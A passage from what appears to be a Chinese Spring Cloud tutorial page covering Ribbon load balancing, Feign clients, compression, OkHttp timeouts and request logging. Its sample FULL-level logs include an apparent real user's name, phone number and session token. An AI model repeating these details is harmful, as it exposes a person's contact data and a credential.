true\n      mime-types: "text/xml,application/xml,application/json"\n      # 用于设置请求的最小阈值\n      min-request-size: 1024\n    # 响应压缩\n    response:\n      enabled: true\n  hystrix:\n    enabled: false\n  okhttp:\n    enabled: true\n  client:\n    config:\n      default:\n        connectTimeout: 30000\n        readTimeout: 40000\n        # BASIC FULL HEADERS NONE\n        loggerLevel: BASIC\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nBASIC 打印如下\n\n2020-06-18 09:45:51.670 DEBUG 26772 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] ---\x3e POST http://server-data-platform/menu/getSonDataMenuList HTTP/1.1\n2020-06-18 09:45:52.637 DEBUG 26772 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] <--- HTTP/1.1 200  (966ms)\n2020-06-18 09:45:52.767 DEBUG 26772 --- [nio-8888-exec-2] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] ---\x3e POST http://server-data-platform/electricityStation/getElectricityStationList HTTP/1.1\n2020-06-18 09:45:52.805 DEBUG 26772 --- [nio-8888-exec-2] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] <--- HTTP/1.1 200  (38ms)\n\n\n\n1\n2\n3\n4\n5\n\n\nFULL 打印如下\n\n2020-06-18 09:54:05.190 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] ---\x3e POST http://server-data-platform/menu/getSonDataMenuList HTTP/1.1\n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] Content-Length: 1733\n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] Content-Type: application/json\n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] \n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] {"data":{"id":null,"parentId":null,"menuName":null,"menuPath":"/electricityStation/list","menuOrder":null,"icon":null,"remarks":null,"menuData":null,"menuButton":null},"token":"5a717dca1142d685c8aa54b45d0388c8","user":{"id":1,"account":"15771720565","name":"冯谦润","phone":"15771720565","onlineState":null,"remarks":"fdsafdsa","rolesId":1,"avatar":null,"token":"5a717dca1142d685c8aa54b45d0388c8","roles":{"id":1,"roleName":"超级管理员","remarks":"2222","menus":null},"menus":[{"id":1,"parentId":0,"menuName":"大屏展示","menuPath":"/dashboard","menuOrder":1000,"icon":"el-icon-monitor","remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":2,"parentId":0,"menuName":"数据分析","menuPath":"/dataAnalysis","menuOrder":2000,"icon":"el-icon-data-line","remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":3,"parentId":0,"menuName":"系统管理","menuPath":"/setting","menuOrder":3000,"icon":"el-icon-setting","remarks":null,"menuData":false,"menuButton":false,"child":[{"id":5,"parentId":3,"menuName":"角色管理","menuPath":"/setting/roles","menuOrder":3200,"icon":null,"remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":6,"parentId":3,"menuName":"菜单管理","menuPath":"/setting/menus","menuOrder":3300,"icon":null,"remarks":null,"menuData":false,"menuButton":false,"child":[]}]},{"id":16,"parentId":0,"menuName":"电站管理","menuPath":"/electricityStation","menuOrder":4000,"icon":"el-icon-lightning","remarks":null,"menuData":false,"menuButton":false,"child":[{"id":17,"parentId":16,"menuName":"电站信息","menuPath":"/electricityStation/list","menuOrder":4100,"icon":null,"remarks":"列出所有电站","menuData":false,"menuButton":false,"child":[]}]}]}}\n2020-06-18 09:54:05.191 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] ---\x3e END HTTP (1733-byte body)\n2020-06-18 09:54:06.014 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] <--- HTTP/1.1 200  (822ms)\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] connection: keep-alive\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] content-type: application/json\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] date: Thu, 18 Jun 2020 01:54:05 GMT\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] keep-alive: timeout=60\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] transfer-encoding: chunked\n2020-06-18 09:54:06.015 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] \n2020-06-18 09:54:06.017 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] {"code":200,"msg":null,"data":[{"id":24,"parentId":17,"menuName":"电站数据","menuPath":"/electricityStation/data","menuOrder":4110,"icon":null,"remarks":null,"menuData":true,"menuButton":false,"child":[{"id":25,"parentId":24,"menuName":"平顶山","menuPath":"/electricityStation/data/pds","menuOrder":4111,"icon":null,"remarks":null,"menuData":true,"menuButton":false,"child":[]}]}]}\n2020-06-18 09:54:06.017 DEBUG 29140 --- [nio-8888-exec-1] com.giant.cloud.api.MenuApi              : [MenuApi#getSonDataMenuList] <--- END HTTP (388-byte body)\n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] ---\x3e POST http://server-data-platform/electricityStation/getElectricityStationList HTTP/1.1\n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] Content-Length: 1756\n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] Content-Type: application/json\n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] \n2020-06-18 09:54:06.453 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] {"data":{"data":{"id":null,"parentId":null,"menuName":null,"menuPath":null,"menuOrder":null,"icon":null,"remarks":null,"menuData":null,"menuButton":null,"menuId":"25"},"current":1,"size":20},"token":"5a717dca1142d685c8aa54b45d0388c8","user":{"id":1,"account":"15771720565","name":"冯谦润","phone":"15771720565","onlineState":null,"remarks":"fdsafdsa","rolesId":1,"avatar":null,"token":"5a717dca1142d685c8aa54b45d0388c8","roles":{"id":1,"roleName":"超级管理员","remarks":"2222","menus":null},"menus":[{"id":1,"parentId":0,"menuName":"大屏展示","menuPath":"/dashboard","menuOrder":1000,"icon":"el-icon-monitor","remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":2,"parentId":0,"menuName":"数据分析","menuPath":"/dataAnalysis","menuOrder":2000,"icon":"el-icon-data-line","remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":3,"parentId":0,"menuName":"系统管理","menuPath":"/setting","menuOrder":3000,"icon":"el-icon-setting","remarks":null,"menuData":false,"menuButton":false,"child":[{"id":5,"parentId":3,"menuName":"角色管理","menuPath":"/setting/roles","menuOrder":3200,"icon":null,"remarks":null,"menuData":false,"menuButton":false,"child":[]},{"id":6,"parentId":3,"menuName":"菜单管理","menuPath":"/setting/menus","menuOrder":3300,"icon":null,"remarks":null,"menuData":false,"menuButton":false,"child":[]}]},{"id":16,"parentId":0,"menuName":"电站管理","menuPath":"/electricityStation","menuOrder":4000,"icon":"el-icon-lightning","remarks":null,"menuData":false,"menuButton":false,"child":[{"id":17,"parentId":16,"menuName":"电站信息","menuPath":"/electricityStation/list","menuOrder":4100,"icon":null,"remarks":"列出所有电站","menuData":false,"menuButton":false,"child":[]}]}]}}\n2020-06-18 09:54:06.454 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] ---\x3e END HTTP (1756-byte body)\n2020-06-18 09:54:06.483 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] <--- HTTP/1.1 200  (29ms)\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] connection: keep-alive\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] content-type: application/json\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] date: Thu, 18 Jun 2020 01:54:05 GMT\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] keep-alive: timeout=60\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] transfer-encoding: chunked\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] \n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] {"code":200,"msg":null,"data":{"current":1,"size":20,"total":1,"records":[{"createTime":"2020-06-15T03:46:17.000+00:00","updateTime":"2020-06-15T03:46:17.000+00:00","deleteFlag":false,"id":1,"menuId":25,"name":"平顶山新能源项目1期","buildingDegree":30,"cityName":"平顶山","cityId":"410400","lng":"113.308","lat":"33.7352","remarks":"测试数据"}]}}\n2020-06-18 09:54:06.484 DEBUG 29140 --- [nio-8888-exec-3] c.giant.cloud.api.ElectricityStationApi  : [ElectricityStationApi#getElectricityStationList] <--- END HTTP (362-byte body)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n我就试到这里了，正常来说 FULL 已经足够了。\n\n\n# Feign 的全局异常处理\n\n@Configuration\npublic class FeignClientErrorDecoder implements ErrorDecoder {\n\n    private static final Log log = LogFactory.getLog(FeignClientErrorDecoder.class);\n\n    @Override\n    public Exception decode(String methodKey, Response response) {\n        try {\n            String body = IoUtil.read(response.body().asInputStream(), "utf-8");\n            Map<String,String> errMap = JSONObject.parseObject(body, HashMap.class);\n            return new InternalException(errMap.get("message"));\n        }catch(Exception e){\n            return new InternalException(e.getMessage());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',normalizedContent:'# ribbon\n\n\n# 一、对比\n\nrpc\n\n * 远程过程调用，像调用本地方法一样调用服务器的服务\n * 支持同步或异步\n * 客户端和服务器之间建立 tcp 连接，可以一次建立一个，也可以多个调用复用一次连接\n * rpc 数据包小 (谷歌 protobuf 以二进制方式传输)\n * 比较复杂要进行：编码，解码，序列化，连接，丢包，拆包，组合，协议制定\n   rest (http)\n * http 请求，支持多种协议和功能\n * 开发方便成本低\n * http 数据包大\n * java 开发：httpclient urlconnection\n\n\n# 二、开发\n\n引入依赖\n\n<dependency>\n    <groupid>org.springframework.cloud</groupid>\n    <artifactid>spring-cloud-starter-netflix-ribbon</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\n在 application 种配置\n\n    @bean\n    @loadbalanced\n    public resttemplate resttemplate(){\n        return new resttemplate();\n    }\n\n\n1\n2\n3\n4\n5\n\n\n修负载均衡改策略\n\n    /**\n     * 功能描述: 负载均衡策略\n     * roundrobinrule:轮询\n     * randomrule:随机\n     * availabilityfilteringrule: 会先过滤掉由于多次访问故障而处于断路器跳闸状态的服务,以及并发的连接数量\n     * 超过阈值的服务,然后对剩余的服务列表按照轮询策略进行访问;\n     * weightedresponsetimerule: 根据平均响应时间计算所有服务的权重,响应时间越快,服务权重越大,被选中的机率越高;\n     * 刚启动时,如果统计信息不足,则使用roundrobinrule策略,等统计信息足够时,会切换到weightedresponsetimerule\n     * retryrule: 先按照roundrobinrule的策略获取服务,如果获取服务失败,则在指定时间内会进行重试,获取可用的服务;\n     * bestavailablerule: 会先过滤掉由于多次访问故障而处于断路器跳闸状态的服务,然后选择一个并发量最小的服务;\n     * zoneavoidancerule: 默认规则,复合判断server所在区域的性能和server的可用性选择服务器;\n     * @return : com.netflix.loadbalancer.irule\n     * @author : big uncle\n     * @date : 2019/9/7 14:07\n     */\n    @bean\n    public irule myrule(){\n        //自定义均衡策略\n        return new randomrule();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n实际调用\n\n/**\n* 订单消费服务\n* @author shengwu ni\n*/\n@restcontroller\n@requestmapping("/consumer/order")\npublic class orderconsumercontroller {\n\n   /**\n    * 订单服务提供者模块的 url 前缀\n    */\n//    private static final string order_provider_url_prefix = "http://localhost:8001";\n   private static final string order_provider_url_prefix = "http://microservice-order";\n\n   @resource\n   private resttemplate resttemplate;\n\n   @getmapping("/get/{id}")\n   public torder getorder(@pathvariable long id) {\n\n       return resttemplate.getforobject(order_provider_url_prefix + "/provider/order/get/" + id, torder.class);\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# feign\n\n\n# fegin 简介\n\nfegin 是 netflix 开发的声明式、模板化的 http 客户端，其令该来自 retrofit、jaxrs-2.0 以及 websocket。feign 可帮助我们更加便捷，优雅的调用 http api。\n在 spring cloud 中，使用 feign 非常简单，创建一个接口，并在接口上添加一些注解，代码就完成了。feign 支持多种注解，例如 feign 自带的注解或者 jax-rs 注解等 。\nspring cloud 对 feign 进行了增强，使 feign 支持了 spring mvc 注解，并整合了 ribbon 和 eureka\n, 从而让 feign 的使用更加便捷。\n\n\n# 使用\n\n添加依赖\n\n\x3c!-- 包含了ribbon 和 hystrix --\x3e\n<dependency>\n    <groupid>org.springframework.cloud</groupid>\n    <artifactid>spring-cloud-starter-openfeign</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n编写 接口，path 是请求控制器的路径，name 是访问服务的 application.name\n\n// name=eureka里注册的服务\n@feignclient(path = "test", name = "client-hyq-life-server")\npublic interface testapi {\n\n\n    @requestmapping(value = "/idnex", method = requestmethod.get)\n    string idnex();\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n编写实现\n\n@restcontroller\n@requestmapping("test")\npublic class testcontroller implements testapi {\n\n    @autowired\n    private testserver testserver;\n\n    @override\n    public string idnex(){\n        return testserver.idnex();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n编写调用\n\n@restcontroller\n@requestmapping("/test")\npublic class testcontroller {\n\n    @autowired\n    private testapi testapi;\n\n    @getmapping("/index")\n    public string index(){\n        return testapi.idnex();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果两个服务是分离的都需要给启动类加\n\n@enablefeignclients\n@springbootapplication\npublic class bffappserverapplication {\n\n    public static void main(string[] args) {\n        springapplication.run(bffappserverapplication.class, args);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# feign 对压缩的支持\n\nfeign:\n  # 不使用 openfeign 自带的熔断\n  hystrix:\n    enabled: false\n  compression:\n    #配置请求 gzip 压缩\n    request:\n      enabled: true\n      #配置压缩支持的 mime type\n      mime-types: text/xml,application/xml,application/json\n      #配置压缩数据大小的最小阀值,只有超过了这个大小的请求才会对其进行压缩。,默认 2048\n      min-request-size: 300\n    #配置响应 gzip 压缩\n    response:\n      enabled: true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# feign 对 okhttp 的支持\n\n依赖\n\n<dependency>\n    <groupid>org.springframework.cloud</groupid>\n    <artifactid>spring-cloud-starter-openfeign</artifactid>\n</dependency>\n<dependency>\n    <groupid>io.github.openfeign</groupid>\n    <artifactid>feign-okhttp</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n拦截日志，这里建议做的有意义一些。\n\n/**\n * @author big uncle\n * @date 2020/6/17 9:02\n * ok http 拦截日志\n **/\n@slf4j\npublic class okhttploginterceptor implements interceptor {\n\n    @override\n    public response intercept(chain chain) throws ioexception {\n        log.debug("okhttpurl : " + chain.request().url());\n        return chain.proceed(chain.request());\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n配置\n\n/**\n * @author big uncle\n * @date 2020/6/17 8:58\n **/\n@configuration\n@conditionalonclass(feign.class)\n@autoconfigurebefore(feignautoconfiguration.class)\npublic class feignokhttpconfig {\n\n    @bean\n    public okhttp3.okhttpclient okhttpclient(){\n        return new okhttp3.okhttpclient.builder()\n                // 读取超时设置\n                .readtimeout(60, timeunit.seconds)\n                // 连接超时设置\n                .connecttimeout(60, timeunit.seconds)\n                //\n                .writetimeout(120, timeunit.seconds)\n                .connectionpool(new connectionpool())\n                .addinterceptor(okhttploginterceptor())\n                // .addinterceptor();\n                .build();\n    }\n\n    @bean\n    public okhttploginterceptor okhttploginterceptor(){\n        return new okhttploginterceptor();\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n配置出现问题，发现配置的超时时间一直不生效，我读取时间设置 30 秒，在拦截里面看只有 1 秒，所以很多时候提示超时。\n最后有个大神跟我说了，fegin 一直都是用的是 default 配置，让我在 yml 配置 connecttimeout，readtimeout\n\nfeign:\n  compression:\n    # 请求压缩\n    request:\n      enabled: true\n      mime-types: "text/xml,application/xml,application/json"\n      # 用于设置请求的最小阈值\n      min-request-size: 1024\n    # 响应压缩\n    response:\n      enabled: true\n  hystrix:\n    enabled: false\n  okhttp:\n    enabled: true\n  client:\n    config:\n      default:\n        connecttimeout: 30000\n        readtimeout: 40000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n经过发现的确可以做到，在代码里的配置优先级居然没有配置文件高，我个人觉得是有问题的，忽然又想到那配置的池是否也是无用的，待观察。\n\n\n# 五、日志\n\n这里为了看每个请求的路径，参数，耗时我们可以进行如下操作，loggerlevel：\n\nfeign:\n  compression:\n    # 请求压缩\n    request:\n      enabled: true\n      mime-types: "text/xml,application/xml,application/json"\n      # 用于设置请求的最小阈值\n      min-request-size: 1024\n    # 响应压缩\n    response:\n      enabled: true\n  hystrix:\n    enabled: false\n  okhttp:\n    enabled: true\n  client:\n    config:\n      default:\n        connecttimeout: 30000\n        readtimeout: 40000\n        # basic full headers none\n        loggerlevel: basic\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nbasic 打印如下\n\n2020-06-18 09:45:51.670 debug 26772 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] ---\x3e post http://server-data-platform/menu/getsondatamenulist http/1.1\n2020-06-18 09:45:52.637 debug 26772 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] <--- http/1.1 200  (966ms)\n2020-06-18 09:45:52.767 debug 26772 --- [nio-8888-exec-2] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] ---\x3e post http://server-data-platform/electricitystation/getelectricitystationlist http/1.1\n2020-06-18 09:45:52.805 debug 26772 --- [nio-8888-exec-2] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] <--- http/1.1 200  (38ms)\n\n\n\n1\n2\n3\n4\n5\n\n\nfull 打印如下\n\n2020-06-18 09:54:05.190 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] ---\x3e post http://server-data-platform/menu/getsondatamenulist http/1.1\n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] content-length: 1733\n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] content-type: application/json\n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] \n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] {"data":{"id":null,"parentid":null,"menuname":null,"menupath":"/electricitystation/list","menuorder":null,"icon":null,"remarks":null,"menudata":null,"menubutton":null},"token":"5a717dca1142d685c8aa54b45d0388c8","user":{"id":1,"account":"15771720565","name":"冯谦润","phone":"15771720565","onlinestate":null,"remarks":"fdsafdsa","rolesid":1,"avatar":null,"token":"5a717dca1142d685c8aa54b45d0388c8","roles":{"id":1,"rolename":"超级管理员","remarks":"2222","menus":null},"menus":[{"id":1,"parentid":0,"menuname":"大屏展示","menupath":"/dashboard","menuorder":1000,"icon":"el-icon-monitor","remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":2,"parentid":0,"menuname":"数据分析","menupath":"/dataanalysis","menuorder":2000,"icon":"el-icon-data-line","remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":3,"parentid":0,"menuname":"系统管理","menupath":"/setting","menuorder":3000,"icon":"el-icon-setting","remarks":null,"menudata":false,"menubutton":false,"child":[{"id":5,"parentid":3,"menuname":"角色管理","menupath":"/setting/roles","menuorder":3200,"icon":null,"remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":6,"parentid":3,"menuname":"菜单管理","menupath":"/setting/menus","menuorder":3300,"icon":null,"remarks":null,"menudata":false,"menubutton":false,"child":[]}]},{"id":16,"parentid":0,"menuname":"电站管理","menupath":"/electricitystation","menuorder":4000,"icon":"el-icon-lightning","remarks":null,"menudata":false,"menubutton":false,"child":[{"id":17,"parentid":16,"menuname":"电站信息","menupath":"/electricitystation/list","menuorder":4100,"icon":null,"remarks":"列出所有电站","menudata":false,"menubutton":false,"child":[]}]}]}}\n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] ---\x3e end http (1733-byte body)\n2020-06-18 09:54:06.014 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] <--- http/1.1 200  (822ms)\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] connection: keep-alive\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] content-type: application/json\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] date: thu, 18 jun 2020 01:54:05 gmt\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] keep-alive: timeout=60\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] transfer-encoding: chunked\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] \n2020-06-18 09:54:06.017 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] {"code":200,"msg":null,"data":[{"id":24,"parentid":17,"menuname":"电站数据","menupath":"/electricitystation/data","menuorder":4110,"icon":null,"remarks":null,"menudata":true,"menubutton":false,"child":[{"id":25,"parentid":24,"menuname":"平顶山","menupath":"/electricitystation/data/pds","menuorder":4111,"icon":null,"remarks":null,"menudata":true,"menubutton":false,"child":[]}]}]}\n2020-06-18 09:54:06.017 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] <--- end http (388-byte body)\n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] ---\x3e post http://server-data-platform/electricitystation/getelectricitystationlist http/1.1\n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] content-length: 1756\n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] content-type: application/json\n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] \n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] {"data":{"data":{"id":null,"parentid":null,"menuname":null,"menupath":null,"menuorder":null,"icon":null,"remarks":null,"menudata":null,"menubutton":null,"menuid":"25"},"current":1,"size":20},"token":"5a717dca1142d685c8aa54b45d0388c8","user":{"id":1,"account":"15771720565","name":"冯谦润","phone":"15771720565","onlinestate":null,"remarks":"fdsafdsa","rolesid":1,"avatar":null,"token":"5a717dca1142d685c8aa54b45d0388c8","roles":{"id":1,"rolename":"超级管理员","remarks":"2222","menus":null},"menus":[{"id":1,"parentid":0,"menuname":"大屏展示","menupath":"/dashboard","menuorder":1000,"icon":"el-icon-monitor","remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":2,"parentid":0,"menuname":"数据分析","menupath":"/dataanalysis","menuorder":2000,"icon":"el-icon-data-line","remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":3,"parentid":0,"menuname":"系统管理","menupath":"/setting","menuorder":3000,"icon":"el-icon-setting","remarks":null,"menudata":false,"menubutton":false,"child":[{"id":5,"parentid":3,"menuname":"角色管理","menupath":"/setting/roles","menuorder":3200,"icon":null,"remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":6,"parentid":3,"menuname":"菜单管理","menupath":"/setting/menus","menuorder":3300,"icon":null,"remarks":null,"menudata":false,"menubutton":false,"child":[]}]},{"id":16,"parentid":0,"menuname":"电站管理","menupath":"/electricitystation","menuorder":4000,"icon":"el-icon-lightning","remarks":null,"menudata":false,"menubutton":false,"child":[{"id":17,"parentid":16,"menuname":"电站信息","menupath":"/electricitystation/list","menuorder":4100,"icon":null,"remarks":"列出所有电站","menudata":false,"menubutton":false,"child":[]}]}]}}\n2020-06-18 09:54:06.454 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] ---\x3e end http (1756-byte body)\n2020-06-18 09:54:06.483 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] <--- http/1.1 200  (29ms)\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] connection: keep-alive\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] content-type: application/json\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] date: thu, 18 jun 2020 01:54:05 gmt\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] keep-alive: timeout=60\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] transfer-encoding: chunked\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] \n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] 